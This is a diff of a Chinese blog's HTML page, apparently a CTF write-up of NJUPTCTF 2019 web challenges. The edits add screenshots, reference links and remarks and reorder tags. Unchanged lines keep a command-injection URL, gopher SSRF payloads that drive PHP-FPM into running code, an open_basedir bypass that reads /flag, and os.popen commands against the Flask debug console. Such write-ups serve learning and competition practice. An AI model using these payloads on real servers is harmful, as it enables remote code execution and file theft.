@@ -40,9 +40,11 @@
 <meta property="og:image" content="https://i.loli.net/2019/11/24/8Bot4jSb1Teu7kM.png">
 <meta property="og:image" content="https://i.loli.net/2019/11/24/oBWyT8D9V1IqvZp.png">
 <meta property="og:image" content="https://i.loli.net/2019/11/24/QdwLsZpGXYrvB5a.png">
+<meta property="og:image" content="https://i.loli.net/2019/11/26/kWFdqZ159GAvStD.png">
+<meta property="og:image" content="https://i.loli.net/2019/11/26/avZuqBYPTXbL69G.png">
 <meta property="og:image" content="https://i.loli.net/2019/11/24/Cf3AbluBkTKHYG4.png">
 <meta property="og:image" content="https://i.loli.net/2019/11/24/lwBrcZTOhJWe8fx.png">
-<meta property="og:updated_time" content="2019-11-25T11:10:57.458Z">
+<meta property="og:updated_time" content="2019-11-26T04:32:27.304Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="NJUPTCTF-web">
 <meta name="twitter:description" content="这次比赛学到了很多，谢谢翔哥的指点👍，翔哥牛逼，力哥也牛逼，只是考试去了😁">
@@ -244,7 +246,7 @@
 <p>paylaod</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://nctf2019.x1ct34m.com:60005/?num=23333%0A&amp;str1=2120624&amp;str2=s214587387a&amp;q.w.q=tac%20f*</span><br></pre></td></tr></table></figure>
 
-<h3 id="replace"><a href="#replace" class="headerlink" title="replace"></a>replace</h3><p>字符串替换，猜测是/e的代码执行，测试之后发现源码中已经存在/e</p>
+<h3 id="replace"><a href="#replace" class="headerlink" title="replace"></a>replace</h3><p>字符串替换，猜测是<code>/e</code>的代码执行，测试之后发现源码中已经存在<code>/e</code></p>
 <p><img src="https://i.loli.net/2019/11/23/REf5QjumetTrFVc.png" alt="image _2_.png"></p>
 <p>发现单引号被过滤，使用<code>chr()</code>绕过即可</p>
 <p><strong>差点又去<code>getcwd()</code>什么的了，还好翔哥及时制止😅</strong></p>
@@ -276,6 +278,9 @@
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gopher://10.0.0.3:9000/_%01%01%00%01%00%08%00%00%00%01%00%00%00%00%00%00%01%04%00%01%01%04%04%00%0F%10SERVER_SOFTWAREgo%20/%20fcgiclient%20%0B%09REMOTE_ADDR127.0.0.1%0F%08SERVER_PROTOCOLHTTP/1.1%0E%02CONTENT_LENGTH58%0E%04REQUEST_METHODPOST%09KPHP_VALUEallow_url_include%20%3D%20On%0Adisable_functions%20%3D%20%0Aauto_prepend_file%20%3D%20php%3A//input%0F%17SCRIPT_FILENAME/var/www/html/index.php%0D%01DOCUMENT_ROOT/%00%00%00%00%01%04%00%01%00%00%00%00%01%05%00%01%00%3A%04%00%3C%3Fphp%20system%28%27whoami%27%29%3Bdie%28%27-----Made-by-SpyD3r-----%0A%27%29%3B%3F%3E%00%00%00%00</span><br></pre></td></tr></table></figure>
 
 <p><strong>中间花了好多时间，下面这个最香</strong></p>
+<blockquote>
+<p>链接：<a href="https://evoa.me/index.php/archives/52/#toc-SSRFGopher" target="_blank" rel="noopener">https://evoa.me/index.php/archives/52/#toc-SSRFGopher</a> </p>
+</blockquote>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python 2.py -c &quot;&lt;?php phpinfo();?&gt;&quot; 127.0.0.1 /var/www/html/index.php</span><br></pre></td></tr></table></figure>
 
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gopher://10.0.0.3:9000/_%01%01%5C%AF%00%08%00%00%00%01%00%00%00%00%00%00%01%04%5C%AF%01%DB%00%00%0E%02CONTENT_LENGTH18%0C%10CONTENT_TYPEapplication/text%0B%04REMOTE_PORT9985%0B%09SERVER_NAMElocalhost%11%0BGATEWAY_INTERFACEFastCGI/1.0%0F%0ESERVER_SOFTWAREphp/fcgiclient%0B%09REMOTE_ADDR127.0.0.1%0F%17SCRIPT_FILENAME/var/www/html/index.php%0B%17SCRIPT_NAME/var/www/html/index.php%09%1FPHP_VALUEauto_prepend_file%20%3D%20php%3A//input%0E%04REQUEST_METHODPOST%0B%02SERVER_PORT80%0F%08SERVER_PROTOCOLHTTP/1.1%0C%00QUERY_STRING%0F%16PHP_ADMIN_VALUEallow_url_include%20%3D%20On%0D%01DOCUMENT_ROOT/%0B%09SERVER_ADDR127.0.0.1%0B%17REQUEST_URI/var/www/html/index.php%01%04%5C%AF%00%00%00%00%01%05%5C%AF%00%12%00%00%3C%3Fphp%20phpinfo%28%29%3B%3F%3E%01%05%5C%AF%00%00%00%00</span><br></pre></td></tr></table></figure>
@@ -289,13 +294,19 @@
 <p><strong>写的脚本中别带双引号，别问我怎么知道的</strong></p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python 2.py -c &quot;&lt;?php mkdir(&apos;/tmp/fuck&apos;);chdir(&apos;/tmp/fuck&apos;);ini_set(&apos;open_basedir&apos;,&apos;..&apos;);chdir(&apos;..&apos;);chdir(&apos;..&apos;);chdir(&apos;..&apos;);chdir(&apos;..&apos;);chdir(&apos;..&apos;);ini_set(&apos;open_basedir&apos;,&apos;/&apos;);print_r(scandir(&apos;/&apos;));readfile(&apos;/flag&apos;);?&gt;&quot; 127.0.0.1 /var/www/html/index.php</span><br></pre></td></tr></table></figure>
 
-<h3 id="flask-website"><a href="#flask-website" class="headerlink" title="flask_website"></a>flask_website</h3><p><code>username</code>就是启动这个<code>Flask</code>的用户 <code>ctf</code></p>
+<h3 id="flask-website"><a href="#flask-website" class="headerlink" title="flask_website"></a>flask_website</h3><blockquote>
+<p>参考链接： <a href="https://xz.aliyun.com/t/2553?tdsourcetag=s_pctim_aiomsg" target="_blank" rel="noopener">https://xz.aliyun.com/t/2553?tdsourcetag=s_pctim_aiomsg</a> </p>
+</blockquote>
+<p><code>username</code>就是启动这个<code>Flask</code>的用户 <code>ctf</code></p>
+<blockquote>
+<p><code>/etc/passwd</code></p>
+</blockquote>
 <p><code>modname</code>为<code>flask.app</code>    </p>
 <p><code>getattr(app, &#39;__name__&#39;, getattr(app.__class__, &#39;__name__&#39;))</code>为<code>Flask</code></p>
-<p><code>getattr(mod, &#39;__file__&#39;, None)</code>为<code>flask</code>目录下的一个<code>app.py</code>的绝对路径<code>/usr/local/lib/python3.6/site-packages/flask/app.py</code></p>
+<p><code>getattr(mod, &#39;__file__&#39;, None)</code>为<code>flask</code>目录下的一个<code>app.py</code>的绝对路径  <code>/usr/local/lib/python3.6/site-packages/flask/app.py</code></p>
 <p><code>uuid.getnode()</code>就是当前电脑的<code>MAC地址</code>，<code>02:42:ac:16:00:02</code></p>
 <blockquote>
-<p>/sys/class/net/eth0/address</p>
+<p><code>/sys/class/net/eth0/address</code></p>
 </blockquote>
 <p><code>str(uuid.getnode())</code>则是<code>mac地址</code>的十进制表达式 <code>2485378220034</code></p>
 <p><code>get_machine_id()</code> ，不存在尝试””或者<code>/proc/sys/kernel/random/boot_id</code></p>
@@ -307,6 +318,10 @@
 <p><img src="https://i.loli.net/2019/11/24/QdwLsZpGXYrvB5a.png" alt="Snipaste_2019-11-24_10-12-20.png"></p>
 <p>但是不知道为啥就是不行</p>
 <p><strong>最后还是翔哥站了出来👍</strong></p>
+<p><strong>一直忽略了最上面的代码，跟着网上的思路走，其实这个就在最前面，思维僵化说的就是我😑</strong></p>
+<p><img src="https://i.loli.net/2019/11/26/kWFdqZ159GAvStD.png" alt="Snipaste_2019-11-26_12-27-36.png"></p>
+<p>这里没改源码</p>
+<p><img src="https://i.loli.net/2019/11/26/avZuqBYPTXbL69G.png" alt="Snipaste_2019-11-26_12-27-49.png"></p>
 <p><img src="https://i.loli.net/2019/11/24/Cf3AbluBkTKHYG4.png" alt="Snipaste_2019-11-24_13-57-54.png"></p>
 <p>在<code>docker</code>中获取的<code>machine-id</code>为这个，这谁顶得住。。</p>
 <p><strong>注意由于是docker环境，每隔几分钟重启会更新这个id</strong></p>
@@ -316,6 +331,7 @@
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">os.popen(&apos;ls /&apos;).read()</span><br><span class="line">os.popen(&apos;cat /t333333hisss_333111aaaggg.txt&apos;).read()</span><br></pre></td></tr></table></figure>
 
 <p><img src="https://i.loli.net/2019/11/24/lwBrcZTOhJWe8fx.png" alt="Snipaste_2019-11-24_14-03-54.png"></p>
+<p><strong>在做某些题目的时候，感觉自己思维还是太僵化了</strong></p>
 
       
 
@@ -591,10 +607,6 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
           <ul class="article-tag-list" q-show="showTags">
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color5">漏洞复现</a>
-              </li>
-             
-              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color4">ctf</a>
               </li>
              
@@ -603,11 +615,7 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color1">74cms</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color4">duomicms</a>
+                <a href="javascript:void(0)" class="js-tag color5">漏洞复现</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -615,11 +623,15 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
               </li>
              
               <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color1">74cms</a>
+              </li>
+             
+              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color3">dedecms</a>
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color4">tp3</a>
+                <a href="javascript:void(0)" class="js-tag color4">duomicms</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -627,11 +639,11 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color4">tp5</a>
+                <a href="javascript:void(0)" class="js-tag color4">tp3</a>
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color3">typecho</a>
+                <a href="javascript:void(0)" class="js-tag color4">tp5</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -640,6 +652,10 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
              
               <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color5">文件上传</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color3">typecho</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -663,19 +679,19 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color1">sql注入</a>
-              </li>
-             
-              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color1">start</a>
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color5">读书笔记</a>
+                <a href="javascript:void(0)" class="js-tag color1">sql注入</a>
               </li>
              
               <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color2">zzzphp</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color5">读书笔记</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -715,11 +731,11 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color4">xxe</a>
+                <a href="javascript:void(0)" class="js-tag color4">xss</a>
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color4">xss</a>
+                <a href="javascript:void(0)" class="js-tag color4">xxe</a>
               </li>
              
               <li class="article-tag-list-item">
